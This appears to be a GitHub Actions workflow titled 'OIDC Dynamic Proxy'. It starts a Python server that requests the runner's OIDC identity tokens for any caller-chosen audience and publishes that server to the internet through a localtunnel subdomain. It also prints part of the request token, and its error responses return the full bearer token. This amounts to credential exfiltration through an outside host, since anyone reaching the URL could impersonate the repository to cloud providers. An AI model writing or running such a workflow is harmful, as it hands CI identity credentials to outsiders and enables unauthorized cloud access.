name: OIDC Dynamic Proxy

on: [workflow_dispatch]

jobs:
  interactive-proxy:
    runs-on: ubuntu-latest
    timeout-minutes: 120
    container:
      image: node:18-bullseye
      options: --privileged --init

    permissions:
      id-token: write # Required to inject OIDC environment variables

    steps:
      - name: Initialize Proxy Environment
        shell: bash # Explicitly use bash to avoid 'Bad substitution' errors
        run: |
          # Verify the variables are present in the environment
          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ] || [ -z "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
            echo "ERROR: OIDC environment variables are not set."
            exit 1
          fi

          echo "=== OIDC Proxy Environment Initialized ==="
          echo "Runner URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
          # Use cut for POSIX compatibility if needed, but bash is guaranteed now
          echo "Token: $(echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN | cut -c1-20)..."

          # 1. Install necessary tools
          apt-get update && apt-get install -y curl jq

          # 2. Create the Python Proxy Server
          cat > /tmp/oidc_proxy.py << 'EOF'
          import http.server
          import socketserver
          import subprocess
          import os
          import json
          import urllib.parse
          import sys

          PORT = 8080
          # These will be read from the environment when the script starts
          REQUEST_URL = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
          REQUEST_TOKEN = os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']

          class OIDCProxyHandler(http.server.BaseHTTPRequestHandler):
              def do_GET(self):
                  parsed = urllib.parse.urlparse(self.path)
                  params = urllib.parse.parse_qs(parsed.query)
                  
                  # Dynamic Control: Allow passing 'audience' from the outside
                  audience = params.get('audience', [''])[0]
                  
                  # Construct the internal GitHub OIDC request
                  final_url = REQUEST_URL
                  if audience:
                      final_url += f"?audience={audience}"
                      
                  # Log the request for observability
                  self.log_message(f"Proxying request to: {final_url}")

                  # Execute the token request using the runner's internal credentials
                  cmd = [
                      'curl', '-s', '-X', 'GET',
                      final_url,
                      '-H', f'Authorization: bearer {REQUEST_TOKEN}',
                      '-H', 'Accept: application/json'
                  ]
                  
                  try:
                      result = subprocess.run(cmd, capture_output=True, text=True, check=True)
                      self.send_response(200)
                      self.send_header('Content-type', 'application/json')
                      self.end_headers()
                      self.wfile.write(result.stdout.encode())
                  except subprocess.CalledProcessError as e:
                      self.send_response(500)
                      self.send_header('Content-type', 'application/json')
                      self.end_headers()
                      self.wfile.write(json.dumps({"error": e.stderr, "cmd": " ".join(cmd)}).encode())

              def log_message(self, format, *args):
                  print(f"[PROXY] {format % args}", file=sys.stderr, flush=True)

          if __name__ == "__main__":
              with socketserver.TCPServer(("", PORT), OIDCProxyHandler) as httpd:
                  print(f"OIDC Proxy Server listening on port {PORT}", file=sys.stderr, flush=True)
                  httpd.serve_forever()
          EOF

          # 3. Start the Proxy Server in the background
          python3 /tmp/oidc_proxy.py &

          # 4. Start a local tunnel to expose the proxy
          npm install -g localtunnel
          
          # Start the tunnel in the background
          lt --port 8080 --subdomain=github-oidc-proxy &

          # 5. Wait for the tunnel to be ready
          echo "Waiting for tunnel to establish..."
          sleep 15
          
          # Keep the job alive
          echo "Proxy is live. Monitor GitHub Actions logs for the public URL."
          sleep 7185
